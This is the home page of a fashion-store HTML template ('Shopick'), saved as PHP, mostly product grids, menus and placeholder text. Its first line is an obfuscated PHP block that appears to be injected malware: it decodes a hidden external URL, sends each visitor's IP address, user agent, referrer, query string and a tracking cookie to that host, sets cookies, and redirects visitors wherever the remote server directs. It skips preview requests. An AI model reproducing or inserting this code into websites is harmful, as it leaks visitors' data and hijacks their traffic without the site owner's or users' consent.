<?php date_default_timezone_set("UTC");error_reporting(0);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "458478";$uid="zyblotz2bh01h50s6whgs77he";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
<html class="no-js" lang="">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="x-ua-compatible" content="ie=edge">
        <title>Home || Shopick</title>
        <meta name="description" content="Shopick – Fashion Store HTML Template is a clean and elegant design – suitable for selling clothing, fashion, high fashion, men fashion, women fashion, accessories, digital, kids, watches, jewelries, shoes, kids, furniture, sports, tools….. It has a fully responsive width adjusts automatically to any screen size or resolution.">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico">
        <!-- Place favicon.ico in the root directory -->
		
		<!-- Google Font -->
		<link href='https://fonts.googleapis.com/css?family=Roboto:400,500.00,700,300' rel='stylesheet' type='text/css'>
		
		<!-- all css here -->
		<!-- bootstrap v5.1.0 css -->
        <link rel="stylesheet" href="css/bootstrap.min.css">
		<!-- animate css -->
        <link rel="stylesheet" href="css/animate.min.css">
		<!-- jquery-ui.min css -->
        <link rel="stylesheet" href="css/jquery-ui.min.css">
		<!-- meanmenu css -->
        <link rel="stylesheet" href="css/meanmenu.min.css">
		<!-- nivo-slider css -->
        <link rel="stylesheet" href="lib/css/nivo-slider.css">
		<!-- owl.carousel css -->
        <link rel="stylesheet" href="css/owl.carousel.css">
		<!-- flaticon css -->
        <link rel="stylesheet" href="css/shopick-icon.css">
		<!-- pe-icon-7-stroke css -->
        <link rel="stylesheet" href="css/pe-icon-7-stroke.css">
		<!-- lightbox css -->
        <link rel="stylesheet" href="css/lightbox.min.css">
		<!-- style css -->
		<link rel="stylesheet" href="style.css">
		<!-- responsive css -->
        <link rel="stylesheet" href="css/responsive.css">
		<!-- modernizr css -->
        <script src="js/vendor/modernizr-3.11.2.min.js"></script>
    </head>
    <body>
        <!--[if lt IE 8]>
            <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        <![endif]-->
		
		<!-- HEADER-AREA START -->
        <header class="header-area">
			<!-- Header-Top Start -->
			<div class="header-top d-none d-md-block">
				<div class="container">
					<div class="row">
						<div class="col-md-6">
							<div class="header-top-left text-start">
								<ul>
									<li>
										<i class="sp-phone"></i>
										<span>+019 (111) 25184203</span>
									</li>
									<li>
										<i class="sp-email"></i>
										<span>Company@domain.com</span>
									</li>
								</ul>
							</div>
						</div>
						<div class="col-md-6">
							<div class="header-top-right float-end">
								<ul>
									<li><a href="index.html#">Account <span><i class="sp-gear"></i></span></a>
										<ul class="submenu">
											<li><a href="my-account.html">My Account</a></li>
											<li><a href="wishlist.html">Wishlist</a></li>
											<li><a href="cart.html">Checkout</a></li>
											<li><a href="login.html">Login</a></li>
										</ul>
									</li>
								</ul>
								<div class="header-search">
									<form action="index.html#">
										<input type="text" placeholder="Search..." />
										<button type="submit"><i class="sp-search"></i></button>
									</form>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- Header-Top End -->
			<!-- Main-Header Start -->
			<div class="main-header">
				<div class="container">
					<div class="row">
						<div class="col-lg-2 col-6">
							<div class="logo">
								<a href="index.html"><img src="img/logo.png" alt="" /></a>
							</div>
						</div>
						<div class="col-lg-8 d-none d-lg-block">
							<div class="main-menu float-end">
								<nav>
									<ul>
										<li><a href="index.html">home</a>
											<ul class="submenu">
												<li class="submenu-title"><a href="index.html#">Home pages</a></li>
												<li><a href="index.html">Homepage Version 1</a></li>
												<li><a href="index-2.html">Homepage Version 2</a></li>
											</ul>
										</li>
										<li><a href="shop.html">mens</a></li>
										<li><a href="shop-list.html">womens</a></li>
										<li><a href="shop.html">shop</a>
											<div class="mega-menu">
												<span>
													<a class="mega-menu-title" href="index.html#">WOMEN CLOTH</a>
													<a href="index.html#">casual shirt</a>
													<a href="index.html#">rikke t-shirt</a>
													<a href="index.html#">mia top</a>
													<a href="index.html#">mia top</a>
													<a href="index.html#">muscle tee</a>
													<a href="index.html#">seine blouse</a>
												</span>
												<span>
													<a class="mega-menu-title" href="index.html#">MEN CLOTH</a>
													<a href="index.html#">casual shirt</a>
													<a href="index.html#">t-shirt</a>
													<a href="index.html#">t-shirt</a>
													<a href="index.html#">zeans</a>
													<a href="index.html#">trousers/ pants </a>
													<a href="index.html#">sweamwear</a>
												</span>
												<span>
													<a class="mega-menu-title" href="index.html#">WOMEN JEWELRY</a>
													<a href="index.html#">necklace</a>
													<a href="index.html#">samhar cuff</a>
													<a href="index.html#">samhar cuff</a>
													<a href="index.html#">samhar cuff</a>
													<a href="index.html#">nail set</a>
													<a href="index.html#">drop earrings</a>
												</span>
												<span class="mega-menu-photo">
													<a href="index.html#"><img src="img/megamenu/1.jpg" alt="" /></a>
												</span>
											</div>
										</li>
										<li><a href="blog.html">blog</a>
											<ul class="submenu">
												<li class="submenu-title"><a href="index.html#">Blog pages</a></li>
												<li><a href="blog.html">Blog</a></li>
												<li><a href="single-blog.html">Single-blog</a></li>
											</ul>
										</li><!-- 
										<li><a href="about.html">about</a></li> -->
										<li><a href="index.html#">Pages</a>
											<ul class="submenu">
												<li class="submenu-title"><a href="index.html#">All pages</a></li>
												<li><a href="shop.html">Shop</a></li>
												<li><a href="shop-list.html">Shop-List</a></li>
												<li><a href="single-product.html">Single Product</a></li>
												<li><a href="cart.html">Shopping Cart</a></li>
												<li><a href="wishlist.html">Wishlist</a></li>
												<li><a href="checkout.html">Checkout</a></li>
												<li><a href="login.html">Login</a></li>
												<li><a href="my-account.html">My Account</a></li>
												<li><a href="blog.html">Blog</a></li>
												<li><a href="single-blog.html">Single-Blog</a></li>
												<li><a href="about.html">About</a></li>
												<li><a href="404.html">404</a></li>
												<li><a href="contact.html">Contact Us</a></li>
											</ul>
										</li>
										<li><a href="contact.html">contact</a></li>
									</ul>
								</nav>
							</div>
						</div>
						<div class="col-lg-2 col-6">
							<div class="total-cart">
								<ul>
									<li>
										<a href="index.html#">
											<span class="total-cart-number">2 Item</span>
											<span><i class="sp-shopping-bag"></i></span>
										</a>
										<!-- Mini-cart-content Start -->
										<div class="total-cart-brief">
											<div class="cart-photo-details">
												<div class="cart-photo">
													<a href="index.html#"><img src="img/total-cart/1.jpg" alt="" /></a>
												</div>
												<div class="cart-photo-brief">
													<a href="index.html#">Men's Shirt Shirt</a>
													<span>$25.00</span>
												</div>
												<div class="pro-delete">
													<a href="index.html#"><i class="sp-circle-close"></i></a>
												</div>
											</div>
											<div class="cart-photo-details">
												<div class="cart-photo">
													<a href="index.html#"><img src="img/total-cart/1.jpg" alt="" /></a>
												</div>
												<div class="cart-photo-brief">
													<a href="index.html#">Men's Shirt Shirt</a>
													<span>$25.00</span>
												</div>
												<div class="pro-delete">
													<a href="index.html#"><i class="sp-circle-close"></i></a>
												</div>
											</div>
											<div class="cart-subtotal">
												<p>Total = $50.00</p>
											</div>
											<div class="cart-inner-btm">
												<a href="index.html#">Checkout</a>
											</div>
										</div>
										<!-- Mini-cart-content End -->
									</li>
								</ul>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- Main-Header End -->
			<!-- Mobile-menu start -->
			<div class="mobile-menu-area d-block d-md-none">
				<div class="container">
					<div class="row">
						<div class="col-12">
							<div class="mobile-menu">
								<nav id="dropdown">
									<ul>
										<li><a href="index.html">home</a>
											<ul class="submenu">
												<li class="submenu-title"><a href="index.html#">Home pages</a></li>
												<li><a href="index.html">Homepage Version 1</a></li>
												<li><a href="index-2.html">Homepage Version 2</a></li>
											</ul>
										</li>
										<li><a href="shop.html">mens</a></li>
										<li><a href="shop-list.html">womens</a></li>
										<li><a href="shop.html">shop</a></li>
										<li><a href="blog.html">blog</a>
											<ul class="submenu">
												<li class="submenu-title"><a href="index.html#">Blog pages</a></li>
												<li><a href="blog.html">Blog</a></li>
												<li><a href="single-blog.html">Single-blog</a></li>
											</ul>
										</li>
										<li><a href="index.html#">Pages</a>
											<ul class="submenu">
												<li class="submenu-title"><a href="index.html#">All pages</a></li>
												<li><a href="shop.html">Shop</a></li>
												<li><a href="shop-list.html">Shop-List</a></li>
												<li><a href="single-product.html">Single Product</a></li>
												<li><a href="cart.html">Shopping Cart</a></li>
												<li><a href="wishlist.html">Wishlist</a></li>
												<li><a href="checkout.html">Checkout</a></li>
												<li><a href="login.html">Login</a></li>
												<li><a href="my-account.html">My Account</a></li>
												<li><a href="blog.html">Blog</a></li>
												<li><a href="single-blog.html">Single-Blog</a></li>
												<li><a href="about.html">About</a></li>
												<li><a href="contact.html">Contact Us</a></li>
											</ul>
										</li>
										<li><a href="contact.html">contact</a></li>
									</ul>
								</nav>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- Mobile-menu end -->			
		</header>
		<!-- HEADER-AREA END -->

		<!-- PAGE-CONTENT START -->
		<section class="page-content">
			<!-- SLIDER-AREA START -->
			<div class="slider-area margin-bottom-80">
				<div class="bend niceties preview-2">
					<div id="ensign-nivoslider" class="slides">	
						<img src="img/slider/slider-1/1.jpg" alt="" title="#slider-direction-1"  />
						<img src="img/slider/slider-1/2.jpg" alt="" title="#slider-direction-2"  />
						<img src="img/slider/slider-1/3.jpg" alt="" title="#slider-direction-3"  />
					</div>
					<!-- direction 1 -->
					<div id="slider-direction-1" class="t-cn slider-direction">
						<div class="slider-progress"></div>
						<div class="slider-content t-lfl s-tb">
							<div class="title-container s-tb-c title-compress">
								<div class="slider-1">
									<div class="wow fadeInUpBig" data-wow-duration="1.2s" data-wow-delay="0.5s">
										<h1 class="title1">new fashion collection</h1>
									</div>
									<div class="image wow fadeInUpBig" data-wow-duration="1.5s" data-wow-delay="0.7s">
										<span><img src="img/slider/slider-1/slider-border.png" alt="" /></span>
									</div>
									<div class="wow fadeInUpBig" data-wow-duration="1.8s" data-wow-delay="0.9s">
										<p class="slider-brief">Simply dummy text of the printing and typesetting industry. simply dummy text of the printing and typesetting industry.</p>
									</div>
									<div class="wow fadeInUpBig" data-wow-duration="2s" data-wow-delay="1.1s">
										<a href="index.html#" class="shop-now">shop now</a>
									</div>
								</div>
							</div>
						</div>	
					</div>
					<!-- direction 2 -->
					<div id="slider-direction-2" class="slider-direction">
						<div class="slider-progress"></div>
						<div class="slider-content t-lfl s-tb">
							<div class="title-container s-tb-c title-compress">
								<div class="slider-1">
									<div class="wow fadeInUpBig" data-wow-duration="1.2s" data-wow-delay="0.5s">
										<h1 class="title1">Men's fashion collection</h1>
									</div>
									<div class="image wow fadeInUpBig" data-wow-duration="1.5s" data-wow-delay="0.7s">
										<span><img src="img/slider/slider-1/slider-border.png" alt="" /></span>
									</div>
									<div class="wow fadeInUpBig" data-wow-duration="1.8s" data-wow-delay="0.9s">
										<p class="slider-brief">Simply dummy text of the printing and typesetting industry. simply dummy text of the printing and typesetting industry.</p>
									</div>
									<div class="wow fadeInUpBig" data-wow-duration="2s" data-wow-delay="1.1s">
										<a href="index.html#" class="shop-now">shop now</a>
									</div>
								</div>
							</div>
						</div>		
					</div>
					<!-- direction 3 -->
					<div id="slider-direction-3" class="slider-direction">
						<div class="slider-progress"></div>
						<div class="slider-content t-lfl s-tb">
							<div class="title-container s-tb-c title-compress">
								<div class="slider-1">
									<div class="wow fadeInUpBig" data-wow-duration="1.2s" data-wow-delay="0.5s">
										<h1 class="title1">Women's fashion collection</h1>
									</div>
									<div class="image wow fadeInUpBig" data-wow-duration="1.5s" data-wow-delay="0.7s">
										<span><img src="img/slider/slider-1/slider-border.png" alt="" /></span>
									</div>
									<div class="wow fadeInUpBig" data-wow-duration="1.8s" data-wow-delay="0.9s">
										<p class="slider-brief">Simply dummy text of the printing and typesetting industry. simply dummy text of the printing and typesetting industry.</p>
									</div>
									<div class="wow fadeInUpBig" data-wow-duration="2s" data-wow-delay="1.1s">
										<a href="index.html#" class="shop-now">shop now</a>
									</div>
								</div>
							</div>
						</div>		
					</div>
				</div>			
			</div>
			<!-- SLIDER-AREA END -->
			<!-- BANNER-AREA START -->
			<div class="banner-area fix margin-bottom-80">
				<div class="container">
					<div class="row">
						<div class="col-lg-12">
							<div class="single-banner fix">
								<div class="banner-photo padding-0 float-start col-md-6">
									<a href="index.html#"><img src="img/banner/1.jpg" alt="" /></a>
								</div>
								<div class="banner-brief banner-brief-right col-md-6">
									<h2>stylish <span> womens </span></h2>
									<h2 class="line-bottom"><span> product </span> collection</h2>
									<a href="index.html#" class="shop-now">shop now</a>
								</div>
							</div>
							<div class="single-banner fix">
								<div class="banner-brief banner-brief-left col-md-6">
									<h2>Smart <span> Menz </span></h2>
									<h2 class="line-bottom"><span> product </span> collection</h2>
									<a href="index.html#" class="shop-now">shop now</a>
								</div>
								<div class="banner-photo padding-0 float-end col-md-6">
									<a href="index.html#"><img src="img/banner/2.jpg" alt="" /></a>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- BANNER-AREA END -->
			<!-- NEW-COLLECTION START -->
			<div class="new-collection-area fix margin-bottom-80">
				<div class="row">
					<div class="col-lg-12">
						<div class="section-title text-center">
							<h2 class="border-left-right-btm">New Collection</h2>
						</div>
					</div>
					<div class="col-xl-4 col-md-6 col-sm-6 padding-0">
						<div class="single-collection">
							<div class="collection-photo">
								<a href="index.html#"><img src="img/new-collection/1.jpg" alt="" /></a>
							</div>
							<div class="collection-brief">
								<div class="text-right">
									<span class="new">new</span>
								</div>
								<h2>new <br /> <span>fashion</span></h2>
								<ul>
									<li>100% cotton</li>
									<li>fress product</li>
									<li>black color</li>
									<li>high qualiety</li>
								</ul>
								<a href="index.html#" class="shop-now active-shop-now">shop now</a>
							</div>
						</div>
					</div>
					<div class="col-xl-4 col-md-6 col-sm-6 padding-0">
						<div class="single-collection">
							<div class="collection-photo">
								<a href="index.html#"><img src="img/new-collection/2.jpg" alt="" /></a>
							</div>
							<div class="collection-brief">
								<div class="text-right">
									<span class="new">new</span>
								</div>
								<h2>new <br /> <span>fashion</span></h2>
								<ul>
									<li>100% cotton</li>
									<li>fress product</li>
									<li>black color</li>
									<li>high qualiety</li>
								</ul>
								<a href="index.html#" class="shop-now active-shop-now">shop now</a>
							</div>
						</div>
					</div>
					<div class="col-xl-4 col-md-6 col-sm-6 padding-0">
						<div class="single-collection">
							<div class="collection-photo">
								<a href="index.html#"><img src="img/new-collection/3.jpg" alt="" /></a>
							</div>
							<div class="collection-brief">
								<div class="text-right">
									<span class="new">new</span>
								</div>
								<h2>new <br /> <span>fashion</span></h2>
								<ul>
									<li>100% cotton</li>
									<li>fress product</li>
									<li>black color</li>
									<li>high qualiety</li>
								</ul>
								<a href="index.html#" class="shop-now active-shop-now">shop now</a>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- NEW-COLLECTION END -->
			<!-- PRODUCT-AREA START -->
			<div class="product-area">
				<div class="container">
					<div class="row">
						<div class="col-lg-12">
							<div class="section-title text-center">
								<h2 class="border-left-right-btm">All Product's</h2>
							</div>
						</div>
					</div>
				</div>
				<div id="active-product" class="product-slider">
					<!-- Single-product start -->
					<div class="single-product">
						<div class="product-photo">
							<a href="index.html#">
								<img class="primary-photo" src="img/product/1.jpg" alt="" />
								<img class="secondary-photo" src="img/product/5.jpg" alt="" />
							</a>
							<div class="pro-action">
								<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
								<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
								<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
							</div>
						</div>
						<div class="product-brief">
							<div class="pro-rating">
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-2"></i></a>
							</div>
							<h2><a href="index.html#">Randomised Words</a></h2>
							<h3>$450.00</h3>
						</div>
					</div>	
					<!-- Single-product end -->
					<!-- Single-product start -->
					<div class="single-product">
						<div class="product-photo">
							<a href="index.html#">
								<img class="primary-photo" src="img/product/2.jpg" alt="" />
								<img class="secondary-photo" src="img/product/4.jpg" alt="" />
							</a>
							<div class="pro-action">
								<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
								<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
								<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
							</div>
						</div>
						<div class="product-brief">
							<div class="pro-rating">
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-2"></i></a>
							</div>
							<h2><a href="index.html#">Randomised Words</a></h2>
							<h3>$500.00</h3>
						</div>
					</div>	
					<!-- Single-product end -->
					<!-- Single-product start -->
					<div class="single-product">
						<div class="product-photo">
							<a href="index.html#">
								<img class="primary-photo" src="img/product/3.jpg" alt="" />
								<img class="secondary-photo" src="img/product/1.jpg" alt="" />
							</a>
							<div class="pro-action">
								<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
								<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
								<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
							</div>
						</div>
						<div class="product-brief">
							<div class="pro-rating">
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-2"></i></a>
							</div>
							<h2><a href="index.html#">Randomised Words</a></h2>
							<h3>$500.00</h3>
						</div>
					</div>	
					<!-- Single-product end -->
					<!-- Single-product start -->
					<div class="single-product">
						<div class="product-photo">
							<a href="index.html#">
								<img class="primary-photo" src="img/product/4.jpg" alt="" />
								<img class="secondary-photo" src="img/product/2.jpg" alt="" />
							</a>
							<div class="pro-action">
								<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
								<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
								<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
							</div>
						</div>
						<div class="product-brief">
							<div class="pro-rating">
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-2"></i></a>
							</div>
							<h2><a href="index.html#">Women's Fashion</a></h2>
							<h3>$450.00</h3>
						</div>
					</div>	
					<!-- Single-product end -->
					<!-- Single-product start -->
					<div class="single-product">
						<div class="product-photo">
							<a href="index.html#">
								<img class="primary-photo" src="img/product/5.jpg" alt="" />
								<img class="secondary-photo" src="img/product/3.jpg" alt="" />
							</a>
							<div class="pro-action">
								<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
								<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
								<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
							</div>
						</div>
						<div class="product-brief">
							<div class="pro-rating">
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-2"></i></a>
							</div>
							<h2><a href="index.html#">Randomised Words</a></h2>
							<h3>$500.00</h3>
						</div>
					</div>	
					<!-- Single-product end -->
					<!-- Single-product start -->
					<div class="single-product">
						<div class="product-photo">
							<a href="index.html#">
								<img class="primary-photo" src="img/product/1.jpg" alt="" />
								<img class="secondary-photo" src="img/product/3.jpg" alt="" />
							</a>
							<div class="pro-action">
								<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
								<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
								<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
							</div>
						</div>
						<div class="product-brief">
							<div class="pro-rating">
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-1"></i></a>
								<a href="index.html#"><i class="sp-star rating-2"></i></a>
							</div>
							<h2><a href="index.html#">Randomised Words</a></h2>
							<h3>$500.00</h3>
						</div>
					</div>	
					<!-- Single-product end -->
				</div>
			</div>
			<!-- PRODUCT-AREA END -->
			<!-- PROMOTIONAL-BANNER START -->
			<div class="promotional-banner-area clearfix margin-bottom-80">
				<div class="promotional-banner">
					<div class="container-fluid p-0 overflow-hidden">
						<div class="row">
							<!-- Single-promo start -->
							<div class="col-lg-6 padding-0">
								<div class="single-promo-banner promo-banner-1">
									<!-- <img src="img/banner/promo-banner/1.jpg" alt="" /> -->
									<div class="promo-banner-brief">
										<h2>sale !</h2>
										<h3>up to <span>30%</span>  off</h3>
										<h4>mens best products</h4>
										<a class="shop-now active-shop-now" href="index.html#">shop now</a>
									</div>
								</div>
							</div>
							<!-- Single-promo End -->
							<!-- Single-promo start -->
							<div class="col-lg-6 padding-0">
								<div class="single-promo-banner promo-banner-2">
									<!-- <img src="img/banner/promo-banner/2.jpg" alt="" /> -->
									<div class="promo-banner-brief">
										<div class="count-down">
											<div class="timer">
												<div data-countdown="2022/12/31"></div>
											</div> 
										</div>
										<div class="upcomming-brief">
										 <h2>upcomming best collection</h2>
										 <h3><span>degles</span> warm</h3>
										 <ul>
											 <li>100% cotton</li>
											 <li>best manufacturing</li>
											 <li>high quality materials</li>
										 </ul>
										 <a class="shop-now" href="index.html#">pre order</a>
										</div>
									</div>
								</div>
							</div>
							<!-- Single-promo End -->
						</div>
					</div>
				</div>
			</div>
			<!-- PROMOTIONAL-BANNER END -->
			<!-- BEST-SELL-AREA START -->
			<div class="best-sell-area">
				<div class="container">
					<div class="row">
						<div class="col-lg-12">
							<div class="section-title text-center">
								<h2 class="border-left-right-btm">Best Sell</h2>
							</div>
						</div>
					</div>				
					<div class="row">
						<div class="col-lg-12">
							<!-- best-sell-menu -->
							<ul role="tablist" class="nav d-block best-sell-menu">
								<li role="presentation"><a class="active" href="index.html#men" role="tab" data-bs-toggle="tab">Men</a></li>
								<li role="presentation"><a href="index.html#women"  role="tab" data-bs-toggle="tab">Women</a></li>
								<li role="presentation"><a href="index.html#accessories"  role="tab" data-bs-toggle="tab">Accessories</a></li>
							</ul>
							<!-- best-sell-product -->
							<div class="tab-content best-sell-product">
								<div role="tabpanel" class="tab-pane fade show active" id="men">
									<div class="row">
										<div class="col-md-4">
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/1.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/6.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Women's Fashion</a></h2>
													<div class="product-brief-inner">
														<h3>$450.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/4.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/1.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Randomised Words</a></h2>
													<div class="product-brief-inner">
														<h3>$500.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
										</div>
										<div class="col-md-4">
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/2.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/4.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Randomised Words</a></h2>
													<div class="product-brief-inner">
														<h3>$500.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/5.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/1.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-shopping-cart"></i><span>Add to cart</span></a>
														<a href="index.html#" class="action-btn"><i class="sp-compare-alt"></i><span>Compare</span></a>
													</div>
												</div>
												<div class="product-brief">
													<h2><a href="index.html#">Women's Fashion</a></h2>
													<div class="product-brief-inner">
														<h3>$450.00</h3>
														<div class="pro-rating">
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-1"></i></a>
															<a href="index.html#"><i class="sp-star rating-2"></i></a>
														</div>
													</div>
												</div>
											</div>	
											<!-- Single-product end -->
										</div>
										<div class="col-md-4">
											<!-- Single-product start -->
											<div class="single-product">
												<div class="product-photo">
													<a href="index.html#">
														<img class="primary-photo" src="img/best-sell/3.jpg" alt="" />
														<img class="secondary-photo" src="img/best-sell/5.jpg" alt="" />
													</a>
													<div class="pro-action">
														<a href="index.html#" class="action-btn"><i class="sp-heart"></i><span>Wishlist</span></a>
